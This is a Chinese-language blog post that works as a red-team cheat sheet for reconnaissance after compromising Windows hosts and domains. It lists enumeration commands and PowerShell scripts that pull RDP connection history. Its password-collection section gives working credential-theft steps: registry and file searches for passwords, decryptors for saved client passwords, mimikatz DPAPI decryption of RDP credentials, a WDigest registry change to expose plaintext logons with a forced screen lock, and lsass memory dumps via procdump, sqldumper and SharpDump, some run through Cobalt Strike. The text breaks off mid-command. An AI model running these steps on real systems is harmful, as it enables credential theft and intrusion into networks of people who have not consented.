<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="内网windows，linux信息收集常用命令及方法">
<meta property="og:type" content="article">
<meta property="og:title" content="内网信息收集">
<meta property="og:url" content="http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
<meta property="og:site_name" content="ceeeeeeb&#39;s blog">
<meta property="og:description" content="内网windows，linux信息收集常用命令及方法">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-03-02T08:08:24.000Z">
<meta property="article:modified_time" content="2020-03-02T09:18:26.762Z">
<meta property="article:author" content="ceeeeeeb">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>内网信息收集</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/02/29/zabbix%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4-md/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&text=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&is_video=false&description=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网信息收集&body=Check out this article: http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&title=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&name=内网信息收集&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/03/02/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/&t=内网信息收集" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows"><span class="toc-number">1.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#单机环境"><span class="toc-number">1.1.</span> <span class="toc-text">单机环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ip段"><span class="toc-number">1.1.1.</span> <span class="toc-text">ip段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#网络连通性"><span class="toc-number">1.1.2.</span> <span class="toc-text">网络连通性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#系统信息"><span class="toc-number">1.1.3.</span> <span class="toc-text">系统信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#进程-amp-amp-安装软件"><span class="toc-number">1.1.4.</span> <span class="toc-text">进程&amp;&amp;安装软件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#用户"><span class="toc-number">1.1.5.</span> <span class="toc-text">用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#管理员-history"><span class="toc-number">1.1.6.</span> <span class="toc-text">管理员 history</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#补丁"><span class="toc-number">1.1.7.</span> <span class="toc-text">补丁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#密码收集"><span class="toc-number">1.1.8.</span> <span class="toc-text">密码收集</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#域环境"><span class="toc-number">1.2.</span> <span class="toc-text">域环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用命令"><span class="toc-number">1.2.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#收集域内信息图形化展示"><span class="toc-number">1.2.2.</span> <span class="toc-text">收集域内信息图形化展示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#枚举域内信息"><span class="toc-number">1.2.3.</span> <span class="toc-text">枚举域内信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spn扫描"><span class="toc-number">1.2.4.</span> <span class="toc-text">spn扫描</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux"><span class="toc-number">2.</span> <span class="toc-text">linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取内核，操作系统和设备信息"><span class="toc-number">2.1.</span> <span class="toc-text">获取内核，操作系统和设备信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#用户和组"><span class="toc-number">2.2.</span> <span class="toc-text">用户和组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境信息"><span class="toc-number">2.3.</span> <span class="toc-text">环境信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#有用的命令"><span class="toc-number">2.4.</span> <span class="toc-text">有用的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务信息"><span class="toc-number">2.5.</span> <span class="toc-text">服务信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#作业和任务"><span class="toc-number">2.6.</span> <span class="toc-text">作业和任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络、路由和通信"><span class="toc-number">2.7.</span> <span class="toc-text">网络、路由和通信</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#软件信息"><span class="toc-number">2.8.</span> <span class="toc-text">软件信息</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        内网信息收集
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ceeeeeeb</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-03-02T08:08:24.000Z" itemprop="datePublished">2020-03-02</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="单机环境"><a href="#单机环境" class="headerlink" title="单机环境"></a>单机环境</h3><h4 id="ip段"><a href="#ip段" class="headerlink" title="ip段"></a>ip段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">ipconfig &#x2F;displaydns	</span><br><span class="line">hosts文件，查看内网解析</span><br><span class="line">netstat -ano </span><br><span class="line">arp -a</span><br><span class="line">route print</span><br><span class="line">nbtscan:nbtscan.exe -m  192.168.0.1&#x2F;24</span><br></pre></td></tr></table></figure>

<h4 id="网络连通性"><a href="#网络连通性" class="headerlink" title="网络连通性"></a>网络连通性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1</span><br><span class="line">tracert 114.114.114.114</span><br><span class="line">SharpNetCheck</span><br><span class="line">Usage: SharpNetCheck -dns -host ceye.io</span><br><span class="line">       SharpNetCheck -http -host&#x2F;ip ceye.io</span><br><span class="line">       SharpNetCheck -all -host ceye.io</span><br><span class="line">自写tcp，upd出网工具</span><br></pre></td></tr></table></figure>

<h4 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">set</span><br><span class="line">qwinsta                            ----- 查看登录情况</span><br><span class="line">qwinsta &#x2F;SERVER:IP                 ----- 查看远程登录情况</span><br><span class="line">fsutil fsinfo drives               ----- 查看所有盘符</span><br></pre></td></tr></table></figure>



<h4 id="进程-amp-amp-安装软件"><a href="#进程-amp-amp-安装软件" class="headerlink" title="进程&amp;&amp;安装软件"></a>进程&amp;&amp;安装软件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;svc</span><br><span class="line">tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V             ----- 查看远程计算机进程列表</span><br><span class="line">wmic process where caption&#x3D;&quot;notepad.exe&quot; get caption,commandline &#x2F;value	获取进程位置</span><br><span class="line">wmic &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct get &#x2F;format:LIST	杀软</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE		从注册表获取软件安装列表</span><br></pre></td></tr></table></figure>

<h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;user &amp;&amp; whoami &#x2F;priv</span><br><span class="line">net user</span><br><span class="line">net localgroup</span><br><span class="line">net localgroup Administrators</span><br><span class="line">wmic USERACCOUNT get Caption,Name,PasswordRequired,Status</span><br></pre></td></tr></table></figure>

<h4 id="管理员-history"><a href="#管理员-history" class="headerlink" title="管理员 history"></a>管理员 history</h4><p><a href="https://github.com/uknowsec/SharpEventLog" target="_blank" rel="noopener">SharpEventLog</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Author: Uknow</span><br><span class="line">Github: https:&#x2F;&#x2F;github.com&#x2F;uknowsec&#x2F;SharpEventLog</span><br><span class="line"></span><br><span class="line">Usage: SharpEventLog.exe -4624</span><br><span class="line">       SharpEventLog.exe -4625</span><br><span class="line">cs:execute-assembly &#x2F;path&#x2F;to&#x2F;SharpEventLog.exe</span><br></pre></td></tr></table></figure>



<p><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</code></p>
<p><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\default&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function GetRdpConnectHistory&#123;</span><br><span class="line"></span><br><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line">logged-in users&#39; RDP Connections History.</span><br><span class="line"></span><br><span class="line">#&gt;</span><br><span class="line">$AllUser &#x3D; Get-WmiObject -Class Win32_UserAccount</span><br><span class="line">foreach($User in $AllUser)</span><br><span class="line">&#123;</span><br><span class="line">	$RegPath &#x3D; &quot;Registry::HKEY_USERS\&quot;+$User.SID+&quot;\Software\Microsoft\Terminal Server Client\Servers\&quot;</span><br><span class="line">	Write-Host &quot;User:&quot;$User.Name</span><br><span class="line">	Write-Host &quot;SID:&quot;$User.SID</span><br><span class="line">	Write-Host &quot;Status:&quot;$User.Status</span><br><span class="line">	Try  </span><br><span class="line">    	&#123; </span><br><span class="line">		$QueryPath &#x3D; dir $RegPath -Name -ErrorAction Stop</span><br><span class="line">	&#125;</span><br><span class="line">	Catch</span><br><span class="line">	&#123;</span><br><span class="line">		Write-Host &quot;No RDP Connections History&quot;</span><br><span class="line">		Write-Host &quot;----------------------------------&quot;</span><br><span class="line">		continue</span><br><span class="line">	&#125;</span><br><span class="line">	foreach($Name in $QueryPath)</span><br><span class="line">	&#123;   </span><br><span class="line">		Try  </span><br><span class="line">    		&#123;  </span><br><span class="line">    			$User &#x3D; (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint</span><br><span class="line">    			Write-Host &quot;User:&quot;$User</span><br><span class="line">    			Write-Host &quot;Server:&quot;$Name</span><br><span class="line">    		&#125;</span><br><span class="line">    		Catch  </span><br><span class="line">    		&#123;</span><br><span class="line">			Write-Host &quot;No RDP Connections History&quot;</span><br><span class="line">    		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Write-Host &quot;----------------------------------&quot;	</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">function GetRdpHistoryAlluser&#123;</span><br><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line">This script will list all users&#39; RDP Connections History.</span><br><span class="line"></span><br><span class="line">#&gt;</span><br><span class="line">$AllUser &#x3D; Get-WmiObject -Class Win32_UserAccount</span><br><span class="line">foreach($User in $AllUser)</span><br><span class="line">&#123;</span><br><span class="line">	$RegPath &#x3D; &quot;Registry::HKEY_USERS\&quot;+$User.SID+&quot;\Software\Microsoft\Terminal Server Client\Servers\&quot;</span><br><span class="line">	Write-Host &quot;User:&quot;$User.Name</span><br><span class="line">	Write-Host &quot;SID:&quot;$User.SID</span><br><span class="line">	Write-Host &quot;Status:&quot;$User.Status</span><br><span class="line">	$QueryPath &#x3D; dir $RegPath -Name -ErrorAction SilentlyContinue</span><br><span class="line">	If(!$?)</span><br><span class="line">	&#123;</span><br><span class="line">		Write-Host &quot;[!]Not logged in&quot;</span><br><span class="line">		Write-Host &quot;[*]Try to load Hive&quot;</span><br><span class="line">		$File &#x3D; &quot;C:\Documents and Settings\&quot;+$User.Name+&quot;\NTUSER.DAT&quot;</span><br><span class="line">		$Path &#x3D; &quot;HKEY_USERS\&quot;+$User.SID</span><br><span class="line">		Write-Host &quot;[+]Path:&quot;$Path </span><br><span class="line">		Write-Host &quot;[+]File:&quot;$File</span><br><span class="line">		Reg load $Path $File</span><br><span class="line">		If(!$?)</span><br><span class="line">		&#123;</span><br><span class="line">			Write-Host &quot;[!]Fail to load Hive&quot;</span><br><span class="line">			Write-Host &quot;[!]No RDP Connections History&quot;</span><br><span class="line">		&#125;</span><br><span class="line">		Else</span><br><span class="line">		&#123;</span><br><span class="line">			$QueryPath &#x3D; dir $RegPath -Name -ErrorAction SilentlyContinue</span><br><span class="line">			If(!$?)</span><br><span class="line">			&#123;</span><br><span class="line">				Write-Host &quot;[!]No RDP Connections History&quot;</span><br><span class="line">			&#125;</span><br><span class="line">			Else</span><br><span class="line">			&#123;</span><br><span class="line">				foreach($Name in $QueryPath)</span><br><span class="line">				&#123;   </span><br><span class="line">					$User &#x3D; (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint</span><br><span class="line">					Write-Host &quot;Server:&quot;$Name</span><br><span class="line">					Write-Host &quot;User:&quot;$User</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			Write-Host &quot;[*]Try to unload Hive&quot;</span><br><span class="line">			Start-Process powershell.exe -WindowStyle Hidden -ArgumentList &quot;Reg unload $Path&quot;		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	foreach($Name in $QueryPath)</span><br><span class="line">	&#123;   </span><br><span class="line">		Try  </span><br><span class="line">		&#123;  </span><br><span class="line">			$User &#x3D; (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint</span><br><span class="line">			Write-Host &quot;Server:&quot;$Name</span><br><span class="line">			Write-Host &quot;User:&quot;$User</span><br><span class="line">		&#125;</span><br><span class="line">		Catch  </span><br><span class="line">		&#123;</span><br><span class="line">			Write-Host &quot;[!]No RDP Connections History&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Write-Host &quot;----------------------------------&quot;	</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">GetRdpHistoryAlluser</span><br></pre></td></tr></table></figure>



<h4 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo </span><br><span class="line">wmic qfe GET hotfixid</span><br></pre></td></tr></table></figure>

<h4 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h4><p><strong>1.注册表中搜索password字段</strong></p>
<p><code>reg query HKCU /f password /t REG_SZ /s</code></p>
<p><strong>2.从系统盘根目录搜索文件名中包含xx字段的文件</strong></p>
<p><code>dir /s *password* == *密码* == *堡垒* == *vpn* == *连接* == *备份* == *口令* == *运维* &gt;&gt; %appdata%\info.txt</code></p>
<p><code>findstr /s /i password *.xml *.txt</code></p>
<p><strong>3.列用户目录树</strong></p>
<p><code>tree c:\users &gt;&gt; %appdata%\info.txt</code></p>
<p><strong>4.Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。解密</strong></p>
<p><strong><a href="https://github.com/uknowsec/SharpDecryptPwd" target="_blank" rel="noopener">SharpDecryptPwd</a></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Usage: SharpDecryptPwd.exe -NavicatCrypto</span><br><span class="line">       SharpDecryptPwd.exe -TeamViewer</span><br><span class="line">       SharpDecryptPwd.exe -FileZilla</span><br><span class="line">       SharpDecryptPwd.exe -WinSCP</span><br><span class="line">       SharpDecryptPwd.exe -Xmangager -p Session_Path</span><br><span class="line">cs:execute-assembly &#x2F;path&#x2F;to&#x2F;SharpDecryptPwd.exe</span><br></pre></td></tr></table></figure>

<p><strong><a href="https://github.com/pxss/navicatpwd" target="_blank" rel="noopener">Navicat</a></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将navicatpwd.cna导入Cobalt Strike脚本并把navicatpwd.exe放到CS目录下得scripts文件夹下即可。</span><br><span class="line">直接运行导出所有连接并使用navicat 11算法进行解密密码</span><br><span class="line">navicatpwd 12 导出所有连接并使用navicat 12算法进行解密密码</span><br></pre></td></tr></table></figure>

<p>手动d导出密码和用户名<br> <code>reg query HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\123\ /v pwd</code></p>
<p> <code>reg query HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\123\ /v username</code></p>
<p>navicat 15057D7BA390 对密码以navicat11算法进行解密(15057D7BA390为加密后得密码)，如果你自己从注册表得到了密码可用此参数</p>
<p>navicat B75D320B6211468D63EB3B67C9E85933 12 以navicat12算法进行解密加密后得密码</p>
<p><strong>5.lazagne</strong></p>
<p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a></p>
<p><strong>6.获取rdp保存的凭证</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmdkey &#x2F;list   要以非system权限运行。</span><br><span class="line"></span><br><span class="line">C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*   rdp凭证保存的位置</span><br><span class="line"></span><br><span class="line">mimikatz &quot;dpapi::cred &#x2F;in:C:\Users\xx\AppData\Local\Microsoft\Credentials\FF359429D6F19C64BA7D3E282558EEB5&quot;</span><br><span class="line">mimikatz privilege::debug sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">mimikatz &quot;dpapi::cred &#x2F;in:C:\Users\xx\AppData\Local\Microsoft\Credentials\FF359429D6F19C64BA7D3E282558EEB5 &#x2F;masterkey:28d1f3252c019f9cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx16dcec8e5dbf5cd0&quot;</span><br></pre></td></tr></table></figure>



<p><strong>7.本机密码及hash获取</strong></p>
<p> Win10及2012以后的系统修改注册表抓明文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">打开：</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">关闭：</span><br><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">强制锁屏：</span><br><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/articles/web/176796.html" target="_blank" rel="noopener">九种姿势运行mimikatz</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.procdump+mimikatz</span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br><span class="line"></span><br><span class="line">2.sqldumper+mimikatz</span><br><span class="line">tasklist|findstr &quot;lsass.exe&quot;</span><br><span class="line">sqldumper.exe &lt;pid&gt; 0 0x01100</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">3.sharpdump+mimikatz</span><br><span class="line">SharpDump.exe</span><br><span class="line">dump的文件是 bin 后缀，拖到本地机器上以后，先重命名为 zip 后缀，然后解压</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump debug516&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">4.reg+impacket</span><br><span class="line">reg save HKLM\SYSTEM sys.hiv</span><br><span class="line">reg save 